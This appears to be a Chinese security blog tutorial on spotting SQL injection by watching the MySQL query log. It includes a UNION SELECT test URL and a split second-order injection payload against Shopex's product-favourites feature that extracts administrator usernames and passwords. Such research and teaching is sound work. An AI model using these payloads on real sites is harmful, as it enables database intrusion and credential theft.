<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>黑盒审计中注入漏洞挖掘思路分享 | Blog of Secer</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <link rel="stylesheet" type="text/css" href="/css/style.css" />
  <meta name="generator" content="Blog of Secer">

  
  
  

  
</head>

<!--
<body class="post-template">
-->
<body class="home-template">
<div id="perspective" class="perspective effect-movedown">
  <div class="container">
    <!-- wrapper -->
    <div class="wrapper">

      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
    <div class="vertical">
        <div class="site-head-content inner">
             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
            <h1 class="blog-title">Blog of Secer</h1>
            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
        </div>
    </div>
</header>

      

<main class="content" role="main">
  <article class="post">
    <span class="post-meta">
      <time datetime="2013-12-21T11:39:02.000Z" itemprop="datePublished">
          2013-12-21
      </time>
    
    
    | 
    <a href='/tag/注入/'>注入</a>,
    
    <a href='/tag/源码审计/'>源码审计</a>
    
    
</span>
    <h1 class="post-title">黑盒审计中注入漏洞挖掘思路分享</h1>
    <section class="post-content">
      <p><b>0x01 </b><b>注入漏洞简介</b></p>  <p><a href="http://ha.cker.in/tag/注入" target="_blank">注入</a>漏洞是web应用中最常见的安全漏洞之一，由于一些程序没有过滤用户的输入，攻击者通过向服务器提交恶意的SQL查询语句，应用程序接收后错误的将攻击者的输入作为原始SQL查询语句的一部分执行，导致改变了程序原始的SQL查询逻辑，额外的执行了攻击者构造的SQL查询语句，从而导致注入漏洞的产生。</p>  <p>攻击者通过SQL注入可以从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作。常见的建站系统出现SQL注入漏洞风险概率是非常高的，而本文就SQL注入漏洞的挖掘方法和大家分享交流，其他web安全漏洞暂不做探讨。</p>  <p><b>0x02 </b><b>漏洞挖掘思路</b></p>  <p>我们知道在<a href="http://ha.cker.in/tag/源码审计" target="_blank">源码审计</a>中这样的SQL注入漏洞很容易被发现，但是对于我们这样不会代码审计又想要挖漏洞的小菜来说该怎么办？那就要讲究方法了，这里和大家分享下我平时挖掘漏洞的一些思路。</p>  <p>首先一个好的测试环境很重要，这样我们可以在短时间内准确的找出注入的位置。在挖注入漏洞之前我们开启MySQL查询日志功能，因为有没有注入的发生，日志里面都可以最直观的看到。</p>  <p>然后用某个文本查看软件看日志文件打开网站程序里面执行的SQL(我这里用的是Bare Tail)</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image001.png" rel="external" target="_blank"><img title="clip_image001" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="713" alt="clip_image001" src="http://img.cker.in/b591e8445a58_3309/clip_image001_thumb.png" width="956" border="0"></a></p>  <p>接着就是找输入点了，这个是重点 (这个过程也要仔细观察mysql查询日志)。</p>  <p>有些输入点信息，程序没有过滤直接查询数据库，就造成了注入，</p>  <p>例如，我GET提交:<a href="http://localhost/index2.php?id=1a" target="_blank" rel="external">http://localhost/index2.php?id=1a</a></p>  <p>在监控的MYSQL日志中跟随1a，此处出现id=1a，可以看出该处未作处理，</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image002.png" rel="external" target="_blank"><img title="clip_image002" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="243" alt="clip_image002" src="http://img.cker.in/b591e8445a58_3309/clip_image002_thumb.png" width="956" border="0"></a></p>  <p>并且是一个整型变量，且在单引号外面，</p>  <p>那么我们提交一下URL即可注入，获取数据任意信息。<a href="http://localhost/index2.php?id=1%20union%20select%20user%28%29%20from%20user" target="_blank" rel="external">http://localhost/index2.php?id=1%20union%20select%20user%28%29%20from%20user</a></p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image003.png" rel="external" target="_blank"><img title="clip_image003" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="369" alt="clip_image003" src="http://img.cker.in/b591e8445a58_3309/clip_image003_thumb.png" width="722" border="0"></a></p><br><a id="more"></a><br><p></p>  <p>实际的提交需要根据数据库中查询的语句来构造。</p>  <p>还有一种情况输入点的信息保存到数据库中，或者服务器的session中二次读取时未处理也可导致注入，这种二次注入很多都是不受单引号影响，所以相对来说好利用，危害也是非常大，在mysql日志中跟随输入点的信息，这时一定要仔细调试，一旦出现该信息，我们可以看出是否可利用，根据相关情况构造注入语句。</p>  <p><b>0x03 Shopex</b><b>漏洞实例</b></p>  <p>以shopex漏洞挖掘为例,shopex为部分源码加密,解密较为繁琐，涉及文件太多，进行代码审计需要耗费很多时间，然而利用上面的方法即可轻松找出漏洞。</p>  <p>打开网站，登录后我们随便来到一个产品页面，点击收藏该产品的时候，查看post的信息，其中的75是我们产品的ID，该处也是个输入点。</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image004.png" rel="external" target="_blank"><img title="clip_image004" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="465" alt="clip_image004" src="http://img.cker.in/b591e8445a58_3309/clip_image004_thumb.png" width="815" border="0"></a></p>  <p>我们将其改为74a在提交一次试试，跟随SQL日志，可以看到其执行的语句为。</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image005.png" rel="external" target="_blank"><img title="clip_image005" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="284" alt="clip_image005" src="http://img.cker.in/b591e8445a58_3309/clip_image005_thumb.png" width="956" border="0"></a></p>  <p>可以看到该处是没有经过过滤的，74a已经成功写入数据库了，如果二次取出时也没有过滤将造成注入，我们再来到会员中心页面，该处会在正常操作下显示我们收藏商品。</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image006.png" rel="external" target="_blank"><img title="clip_image006" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="679" alt="clip_image006" src="http://img.cker.in/b591e8445a58_3309/clip_image006_thumb.png" width="820" border="0"></a></p>  <p>此时查看数据库执行日志发现74a已经出现了，由此可以判断该处存在二次注入。</p>  <p>由于这里是组合而成的，我们构造好注入语句然后拆分提交，即可绕过首页的过滤</p>  <p><a href="http://localhost/index.php?member-SQL-ajaxAddFav.html" target="_blank" rel="external">http://localhost/index.php?member-SQL-ajaxAddFav.html</a></p>  <p>我们将上面的SQL替换成以下信息，分三次提交：</p>  <p>0)/<strong>/union/</strong></p>  <p><strong>/select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,concat(username,0x7c,userpass),23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81/</strong></p>  <p><strong>/from sdb_operatorslimit 1%23</strong></p>  <p>来到会员中心页面在产品收藏处可以看到管理员信息。</p>  <p><a href="http://img.cker.in/b591e8445a58_3309/clip_image007.png" rel="external" target="_blank"><img title="clip_image007" style="border-right: 0px; border-top: 0px; display: inline; border-left: 0px; border-bottom: 0px" height="636" alt="clip_image007" src="http://img.cker.in/b591e8445a58_3309/clip_image007_thumb.png" width="907" border="0"></a></p>  <p>观察数据库日志可以看到此时执行的SQL语句为</p>  <p>Query&#160;&#160; SELECT aGoods.*,aGimage.thumbnail FROM sdb_goods as aGoods left joinsdb_gimages as aGimage on aGoods.image_default=aGimage.gimage_id&#160; WHEREaGoods.goods_id IN (0)//union/<strong>,</strong>/select1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,concat(username,0x7c,userpass),23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81/<strong>,</strong>/fromsdb_operators limit 1#) LIMIT 0, 10 </p>  <p>补丁地址：<a href="http://bbs.shopex.cn/read.php?tid-308423.html" target="_blank" rel="external">http://bbs.shopex.cn/read.php?tid-308423.html</a></p>  <p><b>0x04 </b><b>总结</b></p>  <p>这个半黑盒测试的流程是：</p>  <p>开启查询日志——查找输入点——-跟随输入信息——–是否可利用——-构造注入语句</p>  <p>此过程中的重点就是找输入点和跟随输入信息。</p>  <p>输入点是我们实施注入的入口点，我们必须有效控制这些才能实现注入，这些输入点可以包含其中一些：</p>  <p>1）表单提交，主要是POST请求，也包括GET请求。</p>  <p>2）URL参数提交，主要为GET请求参数。</p>  <p>3）Cookie参数提交。</p>  <p>4）HTTP请求头部的一些可修改的值，比如Referer、User_Agent等。</p>  <p>5）一些边缘的输入点，比如.jpg文件的一些文件信息等。</p>  <p>有些程序采用了一些错误处理，就算SQL查询语句出错了也是没有任何报错的，这个时候我们只能通过监视SQL查询日志来判断了，一旦有注入漏洞的产生这里将是最先看到。</p>  <p>熟练运用该方法基本可以找到程序中所有的注入漏洞，且不需要太懂代码，要得只是耐心和细心。</p>  <p>作者：<a href="http://loudong.360.cn/vul/profile/uid/1862477" target="_blank" rel="external">viekst</a></p>
    </section>
    <footer class="post-footer">
      <section class="author">
    <h4>Secer</h4>
    <p>记录互联网安全历程与个人成长经历</p>
</section>
      <section class="share">
    <h4>Share this post</h4>
    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://www.cker.in/1060.seo/" target="_blank">
        <span class="hidden">weibo</span>
    </a>
    <a class="icon-twitter" href="http://twitter.com/share?url=http://www.cker.in/1060.seo/"
       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <span class="hidden">Twitter</span>
    </a>
    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.cker.in/1060.seo/"
       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <span class="hidden">Facebook</span>
    </a>
    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.cker.in/1060.seo/"
       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
        <span class="hidden">Google+</span>
    </a>
</section>

    </footer>
  </article>
  <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="/1061.seo/">
        ← ColdFusion for Penetration Testers
    </a>
    
    <span class="icon-logo">•</span>
    
    <a class="older-posts" href="/1059.seo/">
        断刀客 →
    </a>
    
</nav>

  <div id="comment" class="comments-area">
    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
    
</div>

</main>


      
<footer class="site-footer">
  
  <div class="inner">
     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
  </div>
</footer>

      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>

<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/js/index.js"></script>
<script type="text/javascript" src="/js/menu.js"></script>





  </div>
</div>

<nav  class="outer-nav top horizontal">

          <a class="icon-home"  href="/"><span>Home</span></a>

          <a class="icon-news"  href="/archive"><span>Archive</span></a>

          <a class="icon-image"  href="/images"><span>Images</span></a>

          <a class="icon-wiki"  href="/wiki/2014-10-28-wiki/"><span>Wiki</span></a>

          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>

          <a class="icon-mail"  href="/about/2014-09-11-mabao/"><span>Contact</span></a>

</nav>

</div>
</body>
</html>
